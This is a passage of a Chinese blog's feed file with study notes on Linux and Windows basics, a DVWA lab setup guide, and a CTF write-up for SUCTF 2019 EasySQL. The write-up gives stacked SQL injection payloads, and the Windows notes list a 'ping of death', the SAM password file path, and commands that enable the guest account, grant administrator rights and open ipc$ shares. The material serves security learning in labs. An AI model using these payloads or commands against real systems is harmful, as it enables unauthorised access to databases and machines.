title="Linux目录结构"></a>Linux目录结构</h4><table><thead><tr><th><strong>目录</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>/</td><td>虚拟目录的根目录，通常不会在这里存储文件</td></tr><tr><td>/bin</td><td>二进制目录，存放用户级的GNU工具 （就是所谓的命令）</td></tr><tr><td>/boot</td><td>启动目录，存放启动文件</td></tr><tr><td>/dev</td><td>设备目录，系统在这里创建设备节点</td></tr><tr><td>/etc</td><td>系统配置文件目录</td></tr><tr><td>/home</td><td>主目录，系统在这里创建用户目录</td></tr><tr><td>/lib</td><td>库目录，存放系统和应用程序的库文件</td></tr><tr><td>/media</td><td>媒体目录，可移动媒体设备的常用挂载点</td></tr><tr><td>/mnt</td><td>挂载目录，另一个可移动媒体设备的常用挂载点</td></tr><tr><td>/opt</td><td>可选目录，常用于存放第三方软件包和数据文件</td></tr><tr><td>/proc</td><td>进程目录，存放现有硬件及当前进程的相关信息</td></tr><tr><td>/root</td><td>Root用户的主目录</td></tr><tr><td>/sbin</td><td>系统二进制目录，存放许多gnu管理员级工具</td></tr><tr><td>/run</td><td>运行目录，存放系统运作时的运行时数据</td></tr><tr><td>/srv</td><td>服务目录，存放本地服务的相关文件</td></tr><tr><td>/sys</td><td>系统目录，存放系统硬件信息的相关文件</td></tr><tr><td>/tmp</td><td>临时目录，可以在该目录中创建删除临时工作文件</td></tr><tr><td>/usr</td><td>用户二进制目录，大量用户级的gnu工具和数据文件存储</td></tr><tr><td>/var</td><td>可变目录，用以存放经常变化的文件，比如日志文件</td></tr></tbody></table><h4 id="Linux系统命令"><a href="#Linux系统命令" class="headerlink" title="Linux系统命令"></a>Linux系统命令</h4><p> <img src="/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/4.png" class="lazyload" data-srcset="/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"> </p><p><img src="https://img-blog.csdnimg.cn/2020051115361644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020051115361644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><p>uname -r 查看内核版本号</p><p>hostname 查看主机名</p><p>ifconfig 查看ip</p><p>cat /proc/cpuinfo 查看cpu信息</p><p>cat /proc/meminfo 查看内存信息</p><p>halt 关机（shutdown -h  或者poweroff）</p><p>reboot 重启</p><p>pwd 查看当前路径</p><p>ls 查看当前目录有哪些文件</p><p>du 统计 目录及文件的空间占用情况 du 选项 目录名</p><p>mkdir 创建目录 -p 递归创建</p><p>touch 新建空文件</p><p>ln -s 源文件地址  目录    建立连接</p><p>cp -r递归复制整个目录树 -p保持源文件属性不变 -f强制覆盖 -i 覆盖时提醒</p><p>rm 删除</p><p>mv移动文件和目录</p><p>find 查找文件和目录</p><p>cat 显示文件的全部内容 </p><p>cat 1 2&gt;3 合并文件</p><p>wc 统计文件中的单次数量 字节数 行数</p><p>gzip bzip2 压缩命令 -d解压缩</p><p>tar -cvf 归档</p><p>tar -zxvf 某档包 解压某归档包</p><p>chmod 777    配置权限</p><p>rpm -ivh /media/Packages/manxxxxxxxx.rpm 用rpm装软件</p><p>rpm -qa 某软件包 查看是否装某软件包</p><p>rpm -e 某软件包 卸载</p><p>yum install 安装（前提）配置yum源</p><p>yum -y remove 卸载</p><p>apt-get install xxx 前提配置网络源</p><p>dpkg -i *.deb</p><p>useradd 增加用户</p><p>su -用户 切换用户</p><p>userdel 删除用户 -r 家目录一起删除</p><p>ifconfig 查看网络接口信息</p><p>netstat 查看端口</p><p>/etc/sysconfig/network-scripts/网络接口配置文件目录</p><p>service network restart 重启网络服务</p><p>ifdown eth0 禁用网络接口</p><p>ifup eth0 应用网络接口</p><p>/etc/resolv.conf 域名配置文件</p><h4 id="vi编辑器"><a href="#vi编辑器" class="headerlink" title="vi编辑器"></a>vi编辑器</h4><p>三种模式</p><h5 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h5><p><img src="/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/1589181577274.png" class="lazyload" data-srcset="/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/1589181577274.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>进入编辑模式</p><p><img src="/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/1589181625703.png" class="lazyload" data-srcset="/2020/05/06/linux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/1589181625703.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>进入底行模式 首先要进入命令模式 然后按 shift 和 ： 号</p><p><img src="https://img-blog.csdnimg.cn/20200511153725678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511153725678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p><h5 id="编译安装过程"><a href="#编译安装过程" class="headerlink" title="编译安装过程"></a>编译安装过程</h5><p><img src="https://img-blog.csdnimg.cn/20200511153738345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200511153738345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电脑常识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows系统基础</title>
      <link href="2020/04/29/windows%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"/>
      <url>2020/04/29/windows%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>windows经常用，但是对于一些注册表还有环境变量都不是很熟悉，趁hacker学习这个号的资源，学一下</p><span id="more"></span><h3 id="window系统要点"><a href="#window系统要点" class="headerlink" title="window系统要点"></a>window系统要点</h3><h4 id="windows系统目录要点"><a href="#windows系统目录要点" class="headerlink" title="windows系统目录要点"></a>windows系统目录要点</h4><h5 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h5><p>C:\Users\HP\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</p><p>快捷访问方式 win+r 输入 shell:startup</p><h5 id="存放账户密码SAM"><a href="#存放账户密码SAM" class="headerlink" title="存放账户密码SAM"></a>存放账户密码SAM</h5><p>C:\Windows\System32\config\SAM</p><h5 id="日志存放在-Perflogs"><a href="#日志存放在-Perflogs" class="headerlink" title="日志存放在 Perflogs"></a>日志存放在 Perflogs</h5><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><h5 id="查看计算机开启了那些服务"><a href="#查看计算机开启了那些服务" class="headerlink" title="查看计算机开启了那些服务"></a>查看计算机开启了那些服务</h5><p>win+r 输入services.msc</p><p>web服务 （网站）</p><p>dns服务 （域名解析）</p><p>dhcp服务（自动给客户端分发ip）</p><p>SMIT服务 （邮件服务）</p><p>telnet服务 （远程连接）</p><p>ssh服务 （远程连接）</p><p>ftp服务（上传下载）</p><p>smb （文件共享）</p><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>常见默认端口</p><p>http协议：80/8080/3128/9080</p><p>FTP协议（文件传输）：21</p><p>Tenlet协议（远程登入）：23</p><p>TFTP（简单文件传输）：69</p><p>SSH（安全远程登入） SCP（文件传输）端口重定向：22</p><p>SMTP（邮件）：25</p><p>POP3:110</p><p>TOMCAT:8080</p><p>WIN2003远程登入：3389</p><p>oracle数据库：1521</p><p>mysql sqlsever:1433</p><p>qq:1080</p><h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><h5 id="操作系统的核心数据库"><a href="#操作系统的核心数据库" class="headerlink" title="操作系统的核心数据库"></a>操作系统的核心数据库</h5><p>打开方式：win+r 输入regedit</p><h5 id="五大根键"><a href="#五大根键" class="headerlink" title="五大根键"></a>五大根键</h5><p>HKEY_CLASSES_ROOT</p><p>HKEY_CURRENT_USER 管理当前用户信息</p><p>HKEY_LOCAL_MACHINE 管理系统硬件配置</p><p>HKEY_USERS</p><p>HKEY_CURRENT_CONFIG 管理当前用户的系统配置</p><h5 id="利用注册表防病毒"><a href="#利用注册表防病毒" class="headerlink" title="利用注册表防病毒"></a>利用注册表防病毒</h5><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</p><p>查看注册表的开机启动信息</p><h4 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h4><p>color 改变当前颜色</p><p>ping -t -l 65500 ip 死亡之ping</p><p>ipconfig 查看ip</p><p>ipconfig /release 释放ip</p><p>ipconfig /renew 重新获取ip</p><p>systeminfo 查看系统信息（可以看看它那些漏洞没打补丁）</p><p>arp -a 查询现在所有接口下同一个网段的地址</p><p>net view 查看局域网其他ip的地址</p><p>shutdown -s -t 180 -c “you are hacked by moth”</p><p>dir 查看目录</p><p>cd 切换目录</p><p>start <a href="http://www.baidu.com/">www.baidu.com</a> 打开网页</p><p>start 123.txt 打开文件</p><p>copy con c:\123.txt 创建文件</p><p>md 创建目录</p><p>rd 删除目录</p><p>ren 原文件名 新文件名  </p><p>del 删除文件</p><p>copy 复制文件 </p><p>move 移动文件</p><p>tree 树形文件夹结构列出</p><p>telnet ip 远程连接</p><p>net use k: \\192.168.1.1\c$</p><p>net use k: \\192.168.1.1\c$ \del</p><p>net start 服务名 打开服务</p><p>net stop 服务名 关闭服务</p><p>net use 用户名 密码  /add  建立用户 </p><p>net user guest /active:yes 激活guest用户</p><p>net user 查看有哪些用户</p><p>net user 账户名 查看账户的属性</p><p>net localgroup administrators 用户名 /add 把该用户添加到管理员中</p><p>net user guest 12345 将guest 用户登入后将密码改为123456</p><p>net password 密码 更改系统登入密码</p><p>net share 查看本地开启的共享</p><p>net share ipc$ 开启ipc$ 共享</p><p>net share c$ /del 刪除c 共享</p><p>netstat -a 查看开启了那些端口</p><p>netstat -n 查看端口的网络连接情况</p><p>netstat -v 查看正在进行的工作</p><p>at id号 开启已注册的某个计划任务 </p><p>at 查看所有的计划任务</p><p>attrib 文件名（目录名）查看某文件(或者目录)的属性</p><p>attrib 文件名 -A -R -S -H 或者 +A +R +S +H 去掉（添加）某文件的存档，只读，系统，隐藏属性</p><h4 id="批处理文件"><a href="#批处理文件" class="headerlink" title="批处理文件"></a>批处理文件</h4><p>后缀名.bat<br>将多组dos命令集中到一起执行</p><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><p>ctrl + a 全选</p><p>ctrl +x 剪切</p><p>ctrl + c 复制</p><p>ctrl +v 粘贴</p><p>ctrl+s 保存</p><p>ctrl +z 撤销</p><p>ctrl +alt +del 任务管理器</p><p>F1  查找帮助</p><p>F2 重命名</p><p>F3 查找</p><p>ctrl +F4 关闭当前端口</p><p>F5 刷新 </p><p>F6 快速查找地址栏</p><p>F10 打开菜单</p><p>F11 最大化端口</p><p>delete 删除</p><p>SHIFT delete 强删除（不过回收站1）</p><p>win+d 显示桌面再按一下反回</p><p>win +r 打开运行对话空</p><p>win +m 最小化</p><p>win +e 打开文件资源管理器</p><p>ctrl +tab 三D桌面</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电脑常识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa环境搭建</title>
      <link href="2020/04/15/dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>2020/04/15/dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>dvwa基本在安全入门的时候都用到了，最近在学习写一些ctfweb题的代码，更深一步的学习漏洞内部的代码逻辑，想先审计一些漏洞环境的代码，首选了dvwa，但是发现自己不知道什么时候卸载了，于是为了自己方便或者其他的入门者方便吧，写一个搭建过程吧</p><span id="more"></span><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>phpstudy（新手的话可以采用这种集成的环境，但是还是建议要手动搭建一下web环境比如手动搭建lamp）：<a href="https://www.xp.cn/">https://www.xp.cn/</a><br>dvwa官网或github上下载dvwa：<a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a></p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>先打开phpstudy<br>开启apache和mysql服务<br><img src="https://img-blog.csdnimg.cn/20200330121755145.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200330121755145.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">把下载好的dv<img src="https://img-blog.csdnimg.cn/20200330121903884.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200330121903884.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">wa放到phpstudy的www目录下<br><img src="https://img-blog.csdnimg.cn/20200330121945303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200330121945303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">创建网站配置如上</p><p><img src="https://img-blog.csdnimg.cn/20200330122052207.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200330122052207.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>打开配置路径<br><img src="https://img-blog.csdnimg.cn/2020033012232690.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020033012232690.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>复制该文件并粘贴到此目录下修改为config.inc.php<br><img src="https://img-blog.csdnimg.cn/20200330122348457.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200330122348457.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">打开config.inc.php文件</p><p><img src="https://img-blog.csdnimg.cn/20200330122456841.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200330122456841.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">将密码修改为你的数据库密码<br>默认root<br>不清楚的查这里<br><img src="https://img-blog.csdnimg.cn/20200330122633549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200330122633549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">访问dvwa<br><img src="https://img-blog.csdnimg.cn/2020033012273255.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020033012273255.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">点击创建数据库应该有个创建页面但是我创建好了截不到图了<br>然后登入默认用户名密码为admin，password<br><img src="https://img-blog.csdnimg.cn/20200330123141218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200330123141218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">完成</p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[SUCTF 2019]EasySQL</title>
      <link href="2020/03/24/SUCTF-2019-EasySQL/"/>
      <url>2020/03/24/SUCTF-2019-EasySQL/</url>
      
        <content type="html"><![CDATA[<p>这个题不知道查询语句的源代码是真的难写<br>所查看大佬的博客：<br><a href="https://www.cnblogs.com/chrysanthemum/p/11729891.html">https://www.cnblogs.com/chrysanthemum/p/11729891.html</a><br><a href="https://blog.csdn.net/qq_44657899/article/details/104533077">https://blog.csdn.net/qq_44657899/article/details/104533077</a></p><span id="more"></span><h1 id="尝试之路加wp"><a href="#尝试之路加wp" class="headerlink" title="尝试之路加wp"></a>尝试之路加wp</h1><p>只有一个文本提交框<br><img src="https://img-blog.csdnimg.cn/20200314173904414.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200314173904414.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>发现可以堆叠注入，用show命令<br>可得到 库名 为ctf，表名Flag<br><img src="https://img-blog.csdnimg.cn/20200314174151540.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200314174151540.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>尝试读表，fuzz过一遍发现handler 和prepare都过滤了<br>于是懵逼<br>查看大佬们的wp，说比赛时泄露了源代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_GET[<span class="string">&#x27;query&#x27;</span>] <span class="operator">||</span> flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><p>于是<br>只需将’||’设置来实现字符串拼接就好<br>于是payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>过滤不严导致</p><h1 id="学到的姿势"><a href="#学到的姿势" class="headerlink" title="学到的姿势"></a>学到的姿势</h1><h2 id="sql-modesql-mode系统变量"><a href="#sql-modesql-mode系统变量" class="headerlink" title="@sql_modesql_mode系统变量"></a>@sql_modesql_mode系统变量</h2><p>@sql_modesql_mode：是一组mysql支持的基本语法及校验规则<br>查看全局的sql_mode:<br><img src="https://img-blog.csdnimg.cn/20200314180153558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200314180153558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">查看当前的sql_mode:<br><img src="https://img-blog.csdnimg.cn/20200314180249421.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200314180249421.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>设置sql_mode:<br><img src="https://img-blog.csdnimg.cn/2020031418055635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020031418055635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">\</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
